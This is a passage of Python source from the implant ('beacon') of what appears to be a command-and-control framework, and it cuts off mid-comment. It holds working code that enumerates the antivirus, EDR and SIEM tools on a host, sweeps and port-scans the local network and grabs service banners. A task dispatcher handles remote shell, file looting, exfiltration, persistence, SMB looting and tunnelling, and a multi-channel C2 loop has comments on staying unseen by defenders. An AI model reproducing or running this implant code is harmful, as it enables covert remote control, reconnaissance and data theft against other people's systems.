        ("ekrn", "ESET", "av"),
        ("AvastSvc", "Avast", "av"),
        ("avgnt", "AVG", "av"),
        ("fshoster", "WithSecure/F-Secure", "av"),
        ("ccSvcHst", "Symantec SEP", "av"),
        ("SepMasterService", "Symantec Master", "av"),
        ("SplunkForwarder", "Splunk Forwarder", "siem"),
        ("splunkd", "Splunk Daemon", "siem"),
        ("wazuh-agent", "Wazuh Agent", "siem"),
        ("OssecSvc", "OSSEC", "siem"),
        ("Sysmon", "Sysmon", "audit"),
        ("Sysmon64", "Sysmon x64", "audit"),
        ("osqueryd", "osquery", "audit"),
    ]

    _AV_PROCS_LINUX = [
        ("clamd", "ClamAV", "av"),
        ("freshclam", "ClamAV Updater", "av"),
        ("falcon-sensor", "CrowdStrike Falcon", "edr"),
        ("cbagentd", "Carbon Black", "edr"),
        ("SentinelAgent", "SentinelOne", "edr"),
        ("elastic-agent", "Elastic Agent", "edr"),
        ("elastic-endpoint", "Elastic Endpoint", "edr"),
        ("xagt", "Trellix/FireEye HX", "edr"),
        ("cortex-xdr", "Cortex XDR", "edr"),
        ("splunkd", "Splunk", "siem"),
        ("wazuh-agentd", "Wazuh", "siem"),
        ("ossec-agentd", "OSSEC", "siem"),
        ("ossec-syscheckd", "OSSEC Syscheck", "siem"),
        ("auditd", "Linux Audit", "audit"),
        ("osqueryd", "osquery", "audit"),
        ("snort", "Snort IDS", "ids"),
        ("suricata", "Suricata IDS", "ids"),
        ("velociraptor", "Velociraptor DFIR", "dfir"),
        ("grr_agent", "GRR Agent", "dfir"),
        ("savd", "Sophos AV", "edr"),
        ("SophosAgent", "Sophos Agent", "edr"),
    ]

    def _exec_avenum(self) -> str:
        """Enumerate AV/EDR/SIEM/audit tools on the system."""
        findings = []
        system = platform.system()

        if system == "Windows":
            # Check services via sc query
            for svc_name, display, cat in self._AV_SERVICES_WIN:
                try:
                    r = subprocess.run(
                        ["sc", "query", svc_name],
                        capture_output=True, text=True, timeout=5,
                    )
                    if r.returncode == 0 and "RUNNING" in r.stdout:
                        findings.append((display, cat, "running"))
                    elif r.returncode == 0 and "STOPPED" in r.stdout:
                        findings.append((display, cat, "stopped"))
                except Exception:
                    pass

            # WMI AntiVirusProduct (SecurityCenter2)
            try:
                r = subprocess.run(
                    ["powershell", "-NoProfile", "-Command",
                     "Get-CimInstance -Namespace root/SecurityCenter2 "
                     "-ClassName AntiVirusProduct | "
                     "Select-Object displayName,productState | "
                     "Format-List"],
                    capture_output=True, text=True, timeout=15,
                )
                if r.returncode == 0 and r.stdout.strip():
                    for block in r.stdout.split("\n\n"):
                        name = ""
                        state = ""
                        for line in block.splitlines():
                            if "displayName" in line:
                                name = line.split(":", 1)[-1].strip()
                            if "productState" in line:
                                state = line.split(":", 1)[-1].strip()
                        if name:
                            try:
                                ps = int(state)
                                enabled = bool((ps >> 12) & 1)
                                updated = not bool((ps >> 4) & 1)
                            except (ValueError, TypeError):
                                enabled, updated = None, None
                            status_parts = []
                            if enabled is True:
                                status_parts.append("enabled")
                            elif enabled is False:
                                status_parts.append("disabled")
                            if updated is True:
                                status_parts.append("up-to-date")
                            elif updated is False:
                                status_parts.append("outdated")
                            status_str = ", ".join(status_parts) if status_parts else "registered"
                            already = any(name.lower() in f[0].lower() for f in findings)
                            if not already:
                                findings.append((name, "av/wmi", status_str))
            except Exception:
                pass

            # Check Windows Firewall
            try:
                r = subprocess.run(
                    ["netsh", "advfirewall", "show", "allprofiles", "state"],
                    capture_output=True, text=True, timeout=10,
                )
                if r.returncode == 0:
                    on_count = r.stdout.lower().count("on")
                    off_count = r.stdout.lower().count("off")
                    findings.append(("Windows Firewall", "fw",
                                     f"{on_count} on / {off_count} off"))
            except Exception:
                pass

            # Check AMSI via registry
            try:
                r = subprocess.run(
                    ["reg", "query",
                     r"HKLM\SOFTWARE\Microsoft\AMSI\Providers"],
                    capture_output=True, text=True, timeout=5,
                )
                provider_count = sum(1 for l in r.stdout.splitlines()
                                     if l.strip().startswith("HKEY"))
                findings.append(("AMSI", "audit",
                                 f"{provider_count} providers"))
            except Exception:
                pass

            # Check AppLocker
            try:
                r = subprocess.run(
                    ["powershell", "-NoProfile", "-Command",
                     "(Get-AppLockerPolicy -Effective).RuleCollections.Count"],
                    capture_output=True, text=True, timeout=10,
                )
                if r.returncode == 0 and r.stdout.strip():
                    cnt = r.stdout.strip()
                    findings.append(("AppLocker", "policy",
                                     f"{cnt} rule collections"))
            except Exception:
                pass

        else:
            # Linux: check running processes
            try:
                r = subprocess.run(
                    ["ps", "axo", "comm"], capture_output=True,
                    text=True, timeout=10,
                )
                procs = set(r.stdout.strip().splitlines())
                for proc_name, display, cat in self._AV_PROCS_LINUX:
                    if proc_name in procs:
                        findings.append((display, cat, "running"))
            except Exception:
                pass

            # Check iptables rules count
            try:
                r = subprocess.run(
                    ["iptables", "-L", "-n", "--line-numbers"],
                    capture_output=True, text=True, timeout=10,
                )
                if r.returncode == 0:
                    rules = sum(1 for l in r.stdout.splitlines()
                                if l and not l.startswith("Chain")
                                and not l.startswith("num"))
                    findings.append(("iptables", "fw", f"{rules} rules"))
            except Exception:
                pass

            # Check SELinux
            try:
                r = subprocess.run(
                    ["getenforce"], capture_output=True, text=True, timeout=5,
                )
                if r.returncode == 0:
                    findings.append(("SELinux", "policy",
                                     r.stdout.strip().lower()))
            except Exception:
                pass

            # Check AppArmor
            try:
                aa = Path("/sys/kernel/security/apparmor/profiles")
                if aa.exists():
                    count = sum(1 for _ in aa.read_text().splitlines())
                    findings.append(("AppArmor", "policy",
                                     f"{count} profiles"))
            except Exception:
                pass

        if not findings:
            return "No AV/EDR/SIEM tools detected (limited enumeration)"

        lines = [f"{'Tool':<35} {'Category':<10} {'Status':<20}",
                 "-" * 65]
        for name, cat, status in findings:
            lines.append(f"{name:<35} {cat:<10} {status:<20}")
        lines.append(f"\n{len(findings)} security tool(s) detected on "
                      f"{platform.node()} ({system})")
        return "\n".join(lines)

    # ── ARP table ──

    _MAC_PREFIXES = {
        "00:50:56": "VMware", "00:0c:29": "VMware", "00:05:69": "VMware",
        "00:1c:14": "VMware", "00:15:5d": "Hyper-V", "08:00:27": "VirtualBox",
        "0a:00:27": "VirtualBox", "52:54:00": "QEMU/KVM",
        "b8:27:eb": "Raspberry Pi", "dc:a6:32": "Raspberry Pi",
        "e4:5f:01": "Raspberry Pi", "d8:3a:dd": "Raspberry Pi",
        "ac:de:48": "Apple", "00:1b:63": "Apple", "3c:22:fb": "Apple",
        "f8:ff:c2": "Apple",
        "00:1a:a0": "Dell", "f8:db:88": "Dell", "00:14:22": "Dell",
        "00:1e:c9": "Dell",
        "00:25:b5": "HP", "3c:d9:2b": "HP", "d4:c9:ef": "HP",
        "70:10:6f": "HP",
        "00:1c:c0": "Intel", "a4:bf:01": "Intel", "00:1b:21": "Intel",
        "f8:63:3f": "Intel",
        "00:04:4b": "Nvidia", "48:b0:2d": "Nvidia",
        "b4:2e:99": "Cisco", "00:1b:0d": "Cisco", "00:1e:14": "Cisco",
        "00:26:0b": "Cisco", "00:50:0f": "Cisco",
        "00:09:0f": "Fortinet", "00:60:b0": "Hewlett Packard",
        "f0:9f:c2": "Ubiquiti", "24:a4:3c": "Ubiquiti",
        "44:d9:e7": "Ubiquiti", "fc:ec:da": "Ubiquiti",
        "00:1a:2b": "Juniper", "00:05:85": "Juniper",
        "00:23:9c": "Juniper",
        "00:0d:b9": "PC Engines", "00:08:e3": "Huawei",
        "00:e0:fc": "Huawei", "48:46:fb": "Huawei",
        "08:00:20": "Sun/Oracle", "00:03:ba": "Sun/Oracle",
        "00:1d:09": "TP-Link", "50:c7:bf": "TP-Link",
        "ec:08:6b": "TP-Link",
        "a8:5e:45": "ASUS", "00:1a:92": "ASUS",
        "00:1f:1f": "ASUS",
        "bc:5f:f4": "ASRock", "d0:50:99": "ASRock",
        "00:0e:8f": "Netgear", "c0:ff:d4": "Netgear",
        "30:46:9a": "Netgear",
        "e0:91:f5": "Synology", "00:11:32": "Synology",
        "c4:3d:c7": "Netgear", "20:cf:30": "QNAP",
        "00:08:9b": "QNAP",
        "b0:be:76": "TP-Link", "14:cc:20": "TP-Link",
        "00:24:d4": "Freebox", "68:a3:78": "Freebox",
        "02:42": "Docker",
    }

    @classmethod
    def _mac_vendor(cls, mac: str) -> str:
        m = mac.lower().replace("-", ":")
        for prefix_len in (8, 5):
            prefix = m[:prefix_len]
            if prefix in cls._MAC_PREFIXES:
                return cls._MAC_PREFIXES[prefix]
        return ""

    @staticmethod
    def _guess_os(ports: list, vendor: str) -> str:
        ps = set(ports)
        if 3389 in ps or 135 in ps or 139 in ps:
            return "Windows"
        if 548 in ps or 5353 in ps:
            return "macOS" if "Apple" in vendor else "Apple/macOS"
        if 22 in ps and 111 in ps:
            return "Linux/Unix"
        if 22 in ps:
            return "Linux"
        if 80 in ps or 443 in ps:
            if vendor:
                if "Cisco" in vendor or "Juniper" in vendor or "Fortinet" in vendor:
                    return "Network Device"
                if "Ubiquiti" in vendor:
                    return "Ubiquiti AP"
                if "Synology" in vendor or "QNAP" in vendor:
                    return "NAS"
            return "Web Device"
        if vendor and ("Raspberry" in vendor):
            return "Linux (RPi)"
        return ""

    @staticmethod
    def _probe_ports(ip: str, ports: list, timeout: float = 0.8) -> list:
        open_ports = []
        for p in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((ip, p))
                open_ports.append(p)
                s.close()
            except Exception:
                pass
        return open_ports

    _SSL_PORTS = {443, 993, 995, 8443, 636, 989, 990, 992, 5986, 9443}

    @staticmethod
    def _grab_banner(ip: str, port: int, timeout: float = 1.5) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, port))
            if port in Beacon._SSL_PORTS or port == 443:
                s.close()
                return Beacon._probe_ssl(ip, port, timeout)
            if port in (80, 8080, 8888, 9090):
                s.sendall(b"HEAD / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\nConnection: close\r\n\r\n")
            elif port == 21:
                pass
            elif port == 25:
                pass
            else:
                s.sendall(b"\r\n")
            s.settimeout(2.0)
            data = s.recv(512)
            s.close()
            line = data.decode("utf-8", errors="replace").split("\n")[0].strip()
            return line[:160]
        except Exception:
            return ""

    @staticmethod
    def _probe_ssl(ip: str, port: int, timeout: float = 2.0) -> str:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((ip, port), timeout=timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=ip) as ssock:
                    cert = ssock.getpeercert(binary_form=False)
                    der = ssock.getpeercert(binary_form=True)
                    ver = ssock.version() or "?"
                    if cert:
                        subj = dict(x[0] for x in cert.get("subject", ()))
                        cn = subj.get("commonName", "?")
                        issuer = dict(x[0] for x in cert.get("issuer", ()))
                        issuer_cn = issuer.get("commonName", issuer.get("organizationName", "?"))
                        not_after = cert.get("notAfter", "?")
                        san_list = []
                        for typ, val in cert.get("subjectAltName", ()):
                            if typ == "DNS":
                                san_list.append(val)
                        san = ", ".join(san_list[:4])
                        parts = [ver, f"CN={cn}"]
                        if issuer_cn != cn:
                            parts.append(f"Issuer={issuer_cn}")
                        parts.append(f"Expires={not_after}")
                        if san:
                            parts.append(f"SAN=[{san}]")
                        return " | ".join(parts)
                    else:
                        return f"{ver} | self-signed/no-cert"
        except ssl.SSLError as e:
            return f"SSL-Error: {str(e)[:80]}"
        except Exception:
            return "SSL"

    _PORT_NAMES = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 111: "RPC", 135: "MSRPC", 139: "NetBIOS",
        143: "IMAP", 161: "SNMP", 389: "LDAP", 443: "HTTPS", 445: "SMB",
        548: "AFP", 631: "IPP", 993: "IMAPS", 995: "POP3S",
        1433: "MSSQL", 1521: "Oracle", 3306: "MySQL", 3389: "RDP",
        5353: "mDNS", 5432: "PostgreSQL", 5900: "VNC", 5985: "WinRM",
        6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
        8888: "HTTP-Alt", 9090: "HTTP-Alt", 9200: "Elasticsearch",
        27017: "MongoDB",
    }

    def _ping_sweep(self):
        local_ips = self._get_local_ips()
        if not local_ips:
            return
        bases = set()
        for ip in local_ips:
            parts = ip.rsplit(".", 1)
            if len(parts) == 2:
                bases.add(parts[0])

        def _ping(target):
            try:
                if platform.system() == "Windows":
                    subprocess.run(
                        ["ping", "-n", "1", "-w", "500", target],
                        capture_output=True, timeout=3,
                    )
                else:
                    subprocess.run(
                        ["ping", "-c", "1", "-W", "1", target],
                        capture_output=True, timeout=3,
                    )
            except Exception:
                pass

        threads = []
        for base in list(bases)[:3]:
            for i in range(1, 255):
                t = threading.Thread(target=_ping, args=(f"{base}.{i}",), daemon=True)
                threads.append(t)
                t.start()
                if len(threads) >= 30:
                    for tt in threads:
                        tt.join(timeout=2)
                    threads = []
        for tt in threads:
            tt.join(timeout=2)

    def _exec_arptable(self) -> str:
        self._ping_sweep()
        entries = []
        try:
            if platform.system() == "Windows":
                r = subprocess.run(
                    ["arp", "-a"], capture_output=True, text=True, timeout=10,
                )
                for line in r.stdout.splitlines():
                    parts = line.split()
                    if len(parts) >= 3 and parts[0].count(".") == 3:
                        ip = parts[0]
                        mac = parts[1].replace("-", ":")
                        typ = parts[2] if len(parts) > 2 else "?"
                        first_octet = int(ip.split(".")[0])
                        if ip not in ("255.255.255.255",) and not ip.endswith(".255") and first_octet < 224:
                            entries.append({"ip": ip, "mac": mac, "type": typ})
            else:
                r = subprocess.run(
                    ["arp", "-a"], capture_output=True, text=True, timeout=10,
                )
                if r.returncode != 0:
                    r = subprocess.run(
                        ["ip", "neigh", "show"], capture_output=True, text=True, timeout=10,
                    )
                for line in r.stdout.splitlines():
                    ip_m = re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", line)
                    mac_m = re.search(r"([\da-fA-F]{2}[:-]){5}[\da-fA-F]{2}", line)
                    if ip_m:
                        ip = ip_m.group(1)
                        mac = mac_m.group(0) if mac_m else "?"
                        first_octet = int(ip.split(".")[0])
                        if ip not in ("255.255.255.255",) and not ip.endswith(".255") and first_octet < 224:
                            entries.append({"ip": ip, "mac": mac, "type": "?"})
        except Exception as e:
            return f"[error] {e}"

        seen_ips = set()
        unique = []
        for ent in entries:
            if ent["ip"] not in seen_ips:
                seen_ips.add(ent["ip"])
                unique.append(ent)
        entries = unique

        my_ips = set(self._get_local_ips())
        common_ports = [21,22,23,25,53,80,110,111,135,139,143,161,389,
                        443,445,548,636,631,993,995,1433,1521,
                        3306,3389,5353,5432,5900,5985,5986,
                        6379,8080,8443,8888,9090,9200,9443,27017]
        threads = []
        lock = threading.Lock()

        def enrich(ent):
            ip = ent["ip"]
            try:
                h = socket.getfqdn(ip)
                ent["hostname"] = "" if h == ip else h
            except Exception:
                ent["hostname"] = ""
            ent["vendor"] = self._mac_vendor(ent["mac"])
            ent["ports"] = self._probe_ports(ip, common_ports)
            ent["os_guess"] = self._guess_os(ent["ports"], ent["vendor"])
            ent["self"] = ip in my_ips
            banners = {}
            for p in ent["ports"][:8]:
                b = self._grab_banner(ip, p)
                if b:
                    banners[str(p)] = b
            ent["banners"] = banners
            port_info = []
            for p in ent["ports"]:
                name = self._PORT_NAMES.get(p, "")
                banner = banners.get(p, "")
                s = str(p)
                if name:
                    s += "/" + name
                if banner:
                    s += " (" + banner + ")"
                port_info.append(s)
            ent["port_info"] = port_info

        for ent in entries:
            t = threading.Thread(target=enrich, args=(ent,), daemon=True)
            threads.append(t)
            t.start()
            if len(threads) >= 10:
                for tt in threads:
                    tt.join(timeout=5)
                threads = []
        for tt in threads:
            tt.join(timeout=5)

        result = json.dumps({"entries": entries, "count": len(entries)})
        return result

    # ── Network scan ──

    def _exec_netscan(self, args: str) -> str:
        timeout_s = 1
        parts = args.strip().split() if args else []
        subnet = parts[0] if parts else ""

        if not subnet:
            for ip in self._get_local_ips():
                octets = ip.rsplit(".", 1)
                if len(octets) == 2:
                    subnet = octets[0] + ".0/24"
                    break

        if not subnet:
            return "[error] No subnet specified and no local IP found"

        base = subnet.split("/")[0].rsplit(".", 1)[0]
        results = []
        results.append(f"Scanning {base}.0/24 ...")

        def _ping_host(ip):
            try:
                if platform.system() == "Windows":
                    r = subprocess.run(
                        ["ping", "-n", "1", "-w", str(timeout_s * 1000), ip],
                        capture_output=True, text=True, timeout=timeout_s + 2,
                    )
                else:
                    r = subprocess.run(
                        ["ping", "-c", "1", "-W", str(timeout_s), ip],
                        capture_output=True, text=True, timeout=timeout_s + 2,
                    )
                return r.returncode == 0
            except Exception:
                return False

        def _tcp_probe(ip, port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout_s)
                s.connect((ip, port))
                s.close()
                return True
            except Exception:
                return False

        alive = []
        threads = []
        lock = threading.Lock()

        def scan_host(ip):
            if _ping_host(ip) or _tcp_probe(ip, 445) or _tcp_probe(ip, 22):
                hostname = ""
                try:
                    hostname = socket.getfqdn(ip)
                    if hostname == ip:
                        hostname = ""
                except Exception:
                    pass
                ports = []
                for p in [22, 80, 135, 139, 443, 445, 3389, 8080, 8443]:
                    if _tcp_probe(ip, p):
                        ports.append(p)
                with lock:
                    alive.append({"ip": ip, "hostname": hostname, "ports": ports})

        for i in range(1, 255):
            ip = f"{base}.{i}"
            t = threading.Thread(target=scan_host, args=(ip,), daemon=True)
            threads.append(t)
            t.start()
            if len(threads) >= 20:
                for t in threads:
                    t.join(timeout=timeout_s + 3)
                threads = []

        for t in threads:
            t.join(timeout=timeout_s + 3)

        alive.sort(key=lambda h: tuple(int(o) for o in h["ip"].split(".")))
        my_ips = set(self._get_local_ips())

        for h in alive:
            marker = " [SELF]" if h["ip"] in my_ips else ""
            port_str = ",".join(str(p) for p in h["ports"]) if h["ports"] else "-"
            host_str = f' ({h["hostname"]})' if h["hostname"] else ""
            results.append(f'  {h["ip"]}{host_str}  ports:[{port_str}]{marker}')

        results.append(f"\n{len(alive)} hosts alive")
        return "\n".join(results)

    # ── Task dispatcher ──

    def _process_tasking_batch(self, tasking: dict):
        """Run a {"tasks": [...]} batch in order, or a lone task dict from an
        older server once."""
        if not tasking:
            return
        if "tasks" not in tasking:
            self._process_tasking(tasking)
            return
        tasks = tasking["tasks"]
        if not isinstance(tasks, list):
            logger.warning("Ignoring malformed task batch: %s", type(tasks).__name__)
            return
        for task in tasks:
            if not isinstance(task, dict):
                continue
            try:
                self._process_tasking(task)
            except Exception as e:
                logger.warning("Task %s failed: %s", task.get("id", "?"), e)
            # kill clears _running; the rest of the batch must not follow it.
            if not self._running:
                break

    def _process_tasking(self, tasking: dict):
        if not tasking:
            return

        cmd = tasking.get("cmd", "")
        args = tasking.get("args", "")
        task_id = tasking.get("id", "")
        data = tasking.get("data", "")

        status = "ok"
        output = ""
        result_data = None

        try:
            if cmd == "reconfig":
                try:
                    reconf = json.loads(data) if isinstance(data, str) else data
                    parts = []
                    if "c2_profile" in reconf:
                        self._c2_profile = reconf["c2_profile"]
                        parts.append("C2 profile updated")
                        if self._c2_profile.get("useragent"):
                            parts.append(f"UA: {self._c2_profile['useragent'][:60]}")
                        n_get = len(self._c2_profile.get("http_get", {}).get("uris", []))
                        n_post = len(self._c2_profile.get("http_post", {}).get("uris", []))
                        if n_get or n_post:
                            parts.append(f"URIs: {n_get} GET, {n_post} POST")
                        logger.info("C2 profile reconfigured dynamically")
                    if reconf.get("sleeptime"):
                        asked = int(reconf["sleeptime"]) / 1000
                        self.interval = _clamp_interval(asked)
                        if self.interval != asked:
                            parts.append(f"interval={self.interval}s "
                                         f"(asked {asked}s, floor is "
                                         f"{_MIN_INTERVAL}s)")
                        else:
                            parts.append(f"interval={self.interval}s")
                    if reconf.get("jitter"):
                        self.jitter = max(0, min(100, int(reconf["jitter"]))) / 100.0
                        parts.append(f"jitter={int(self.jitter*100)}%")
                    output = " — ".join(parts) if parts else "No changes applied"
                except Exception as e:
                    status = "error"
                    output = f"Reconfig failed: {e}"

            elif cmd == "sleep":
                parts = str(args).split()
                asked = float(parts[0])
                self.interval = _clamp_interval(asked)
                if len(parts) > 1:
                    self.jitter = max(0, min(100, float(parts[1]))) / 100.0
                output = f"Sleep {self.interval}s jitter {int(self.jitter * 100)}%"
                if self.interval != asked:
                    # Said rather than clamped in silence. Clamping without
                    # saying so is what made a healthy beacon look like a
                    # failing one for as long as this project has existed:
                    # it reported the number it was asked for and honoured
                    # a different one.
                    output += (f" (asked {asked:g}s; the floor is "
                               f"{_MIN_INTERVAL}s)")
                logger.info(output)

            elif cmd == "kill":
                logger.warning("Kill command received")
                output = "Shutting down"
                self._running = False

            elif cmd == "shell":
                timeout = tasking.get("timeout", 300)
                output = self._exec_shell(args, timeout=timeout)

            elif cmd == "ls":
                output = self._exec_ls(args or ".")
            elif cmd == "lsjson":
                output = self._exec_lsjson(args or ".")

            elif cmd == "cat":
                output = self._exec_cat(args)

            elif cmd == "pwd":
                output = self._exec_pwd()

            elif cmd == "cd":
                output = self._exec_cd(args)

            elif cmd == "cp":
                parts = args.split(None, 1)
                if len(parts) == 2:
                    output = self._exec_cp(parts[0], parts[1])
                else:
                    status, output = "error", "Usage: cp <src> <dst>"

            elif cmd == "mv":
                parts = args.split(None, 1)
                if len(parts) == 2:
                    output = self._exec_mv(parts[0], parts[1])
                else:
                    status, output = "error", "Usage: mv <src> <dst>"

            elif cmd == "rm":
                output = self._exec_rm(args)

            elif cmd == "mkdir":
                output = self._exec_mkdir(args)

            elif cmd == "chmod":
                parts = args.split(None, 1)
                if len(parts) == 2:
                    output = self._exec_chmod(parts[0], parts[1])
                else:
                    status, output = "error", "Usage: chmod <mode> <path>"

            elif cmd == "write":
                output = self._exec_write(args, data)

            elif cmd == "upload":
                output = self._exec_upload(args, data)

            elif cmd == "download":
                dl = self._exec_download(args)
                if "error" in dl:
                    status = "error"
                    output = dl["error"]
                else:
                    output = f"Downloaded {dl['filename']} ({dl['size']} bytes)"
                    result_data = dl

            elif cmd == "loot":
                dl = self._exec_loot(args)
                if "error" in dl:
                    status = "error"
                    output = dl["error"]
                else:
                    fc = dl.get("files", 1)
                    output = f"Looted {dl['filename']} ({dl['size']} bytes, {fc} files)"
                    result_data = dl

            elif cmd == "exfil":
                output = "Exfil scan triggered"
                logger.info("Exfil tasking received")

            elif cmd == "netscan":
                output = self._exec_netscan(args)

            elif cmd == "arptable":
                output = self._exec_arptable()

            elif cmd == "persist":
                output = self._exec_persist(args)

            elif cmd == "unpersist":
                output = self._exec_unpersist(args)

            elif cmd == "proxyinfo":
                output = self._exec_proxyinfo()

            elif cmd == "egress":
                # Beside `proxyinfo`, which is the verb that reports what
                # this one changes.
                output = self._exec_egress(args)

            elif cmd == "avenum":
                output = self._exec_avenum()

            elif cmd == "smbloot":
                output = self._exec_smbloot(args)

            elif cmd == "tunnel":
                output = self._exec_tunnel(args)

            else:
                status = "error"
                output = f"Unknown command: {cmd}"

        except Exception as e:
            status = "error"
            output = f"[exception: {e}]"

        if task_id:
            sent = False
            if self.https_enabled and not sent:
                try:
                    self._send_result_https(task_id, status, output, result_data)
                    sent = True
                except Exception:
                    pass
            if self.smb_enabled and not sent:
                try:
                    self._send_result_smb(task_id, status, output, result_data)
                    sent = True
                except Exception:
                    pass
            if self.quic_enabled and not sent:
                try:
                    self._send_result_quic(task_id, status, output, result_data)
                    sent = True
                except Exception:
                    pass
            if self.gsocket_enabled and not sent:
                # Last, as the leg is last in the tasking chain, and for
                # the same reason: it is the one that costs a child
                # process. A result that reaches the server through the
                # carrier is also the only way work tasked over the
                # rescue gets reported at all, since DNS carries nothing
                # out.
                try:
                    self._send_result_gsocket(task_id, status, output,
                                              result_data)
                    sent = True
                except Exception:
                    pass

    # ── Main loop ──

    def _beacon_loop(self):
        logger.info(
            "Beacon started — ID=%s interval=%ds jitter=%d%%",
            self._implant_id, self.interval, int(self.jitter * 100),
        )

        # The preamble, and not an HTTPS one: it used to be gated on
        # `https_enabled`, which was true enough while HTTPS was the only
        # leg that carried a registration of its own. The configuration
        # this beacon's fifth leg exists for is the one where HTTPS is
        # off, and gated on it such an implant never registered at all --
        # it never appeared in the fleet, and looked healthy from every
        # other angle.
        #
        # Gated on there being something to try rather than attempted
        # regardless: a walk of an empty chain would spend all ten
        # attempts and ten backoff sleeps before the first cycle, and
        # then warn about a registration nothing could have attempted. A
        # gsocket-only implant is exactly that case at beacon start --
        # its carrier is not up, because the latch and nothing else
        # starts it -- so it skips this and registers from inside the
        # loop instead, on the cycle after the latch brought the carrier
        # up. See `_registration_legs`.
        #
        # One attempt is one walk of the chain, so for an HTTPS-only
        # beacon the ten attempts, the backoff and the warning are
        # exactly what they always were.
        if self._registration_legs():
            attempts = 0
            while self._running and not self._registered and attempts < 10:
                if self._register_upstream():
                    self._consecutive_failures = 0
                    break
                attempts += 1
                self._consecutive_failures = attempts
                self._backoff_sleep()
            if not self._registered:
                logger.warning("Registration failed, proceeding unregistered")
                self._consecutive_failures = 0

        while self._running:
            tasking = None
            # Which leg delivered, if any. It decides whether the rescue
            # latch re-arms, and only an *upstream* leg may do that:
            # receiving over DNS proves nothing about getting out, because
            # that channel is receive-only. Letting DNS re-arm it made the
            # rescue periodic -- the agent answers a rescue with one
            # attempt, the attempt arrives over DNS, the latch opens, the
            # attempt fails, and the next cycle sends another. Measured at
            # six queries in twelve cycles before this was fixed.
            delivered_by = None
            # Whatever the last cycle learned is no longer true. A failure
            # from three cycles ago riding along in a rescue would make an
            # operator read a stale reason as a current one.
            self._start_cycle()

            if self.https_enabled:
                tasking = self._beacon_https()
                if tasking is not None:
                    delivered_by = "https"

            if tasking is None and self.dns_enabled:
                tasking = self._beacon_dns()
                if tasking is not None:
                    delivered_by = "dns"

            if tasking is None and self.smb_enabled:
                tasking = self._beacon_smb()
                if tasking is not None:
                    delivered_by = "smb"
                # Not `_registered = True`: the id the server assigned has
                # to be adopted too, or every result afterwards is filed
                # under the implant id and misses the agent's `history`.
                # See `_adopt_registration`, which all four upstream legs
                # share.
                self._adopt_registration(tasking)

            if tasking is None and self.quic_enabled:
                tasking = self._beacon_quic()
                if tasking is not None:
                    delivered_by = "quic"
                self._adopt_registration(tasking)

            if tasking is None and self.gsocket_enabled:
                # Last, and it does not start the carrier: that happens
                # below, once this cycle has concluded that nothing
                # delivered. So the first cycle of an outage finds no
                # carrier and records `carrier_failed`, which is the price
                # of a healthy implant holding no connection to the relay
                # network -- see `_beacon_gsocket`.
                tasking = self._beacon_gsocket()
                if tasking is not None:
                    delivered_by = "gsocket"
                self._adopt_registration(tasking)

            # Stuck means no *upstream* leg delivered -- not that nothing
            # came back. The team server's DNS tasking route answers with
            # an encrypted body even when the queue is empty, on purpose,
            # so that it is not an existence oracle; that body decrypts to
            # {} and `tasking` is therefore rarely None. Keying the trigger
            # on `tasking is None` meant a beacon with three dead upstream
            # legs and a reachable DNS listener looked fine to itself for
            # ever, and the rescue never fired in the one configuration it
            # exists for. Receiving work over DNS is not getting out: the
            # results of that work cannot be reported either.
            if delivered_by not in _RESCUE_UPSTREAM:
                # Another cycle with no way out. Counted before anything
                # acts on it, because this is where "the first stuck
                # cycle" is defined and the decider may not act on it.
                self._stuck_cycles += 1
                # The way out's two ends, in this order and here.
                #
                # Absorbing first, and **before `_maybe_rescue`**: the
                # scout's `dot1x_seen` and `portal_answered` are bits of
                # the record the rescue is about to send, so a cycle that
                # absorbed afterwards would report a port as unwatched
                # that the tap had just seen authenticate. They are also
                # the names a rule may match, and `_egress_act` below
                # reads the same evidence.
                #
                # Publishing second, and **before `_egress_act`**: the
                # state file is what `_way_out_record_attempt` appends
                # this cycle's attempt to, so a window published after the
                # attempt would lose it. One write and one append per
                # stuck cycle.
                #
                # Both are no-ops with `c2.way_out` off, which is how this
                # ships, and neither can raise.
                self._way_out_absorb_flags()
                self._way_out_publish_state()
                # The gsocket leg's latch. It is the operator's decision
                # and not an optimisation: a healthy implant holds no
                # connection to the Global Socket Relay Network at all,
                # because that is a connection a defender can see and the
                # four legs above were working. Once started it is never
                # stopped, so the second outage costs no readiness wait.
                #
                # Before `_maybe_rescue` and not after: if the carrier
                # cannot be started, the reason is the most useful thing
                # the rescue can carry, and a start attempted afterwards
                # would report it one cycle late. It is also the whole
                # restart loop -- a cycle whose carrier died is a cycle
                # where nothing delivered, so this is where it comes back.
                #
                # **With the decider enabled the latch moves behind it**,
                # to the bottom of this branch, which is the operator's
                # decision too: an `egress gsocket` rule could otherwise
                # only ever spend budget on a carrier that was already up
                # by the time the rule was read. The enabled case pays for
                # that twice -- the paragraph above is lost, since a
                # carrier started after the rescue reports its problem one
                # cycle late, and the first stuck cycle starts no carrier
                # at all, since the decider may not act on it and neither
                # may its fallback. Both are a trade the operator makes in
                # a policy row rather than a constant: a first rule of
                # `gsocket` brings the carrier up on the first cycle the
                # decider may act, and one that tries a proxy first has
                # spent that cycle deliberately.
                #
                # Disabled is how this ships, and then this line is
                # exactly where and what it has always been --
                # `test_gsocket_leg.py`'s latch tests describe that case
                # and pass unchanged. A latch behind a *disabled* decider
                # would mean a stuck implant never started its carrier,
                # which is the leg not working in the shipped
                # configuration.
                #
                # The carrier has three starters now, not one: this line,
                # the same latch again at the bottom of this branch when
                # the decider is enabled, and `egress gsocket` -- which is
                # both an operator asking for it sooner and how a
                # `gsocket` rule gets it. All of them go through
                # `_gsocket_start`, which is still the only thing in this
                # process that execs a `gs-netcat`, holds the restart
                # delay and holds the attempt ceiling.
                if self.gsocket_enabled and not self._egress_enabled:
                    self._gsocket_start()
                # Resolved before the dispatch below, so an answer to the
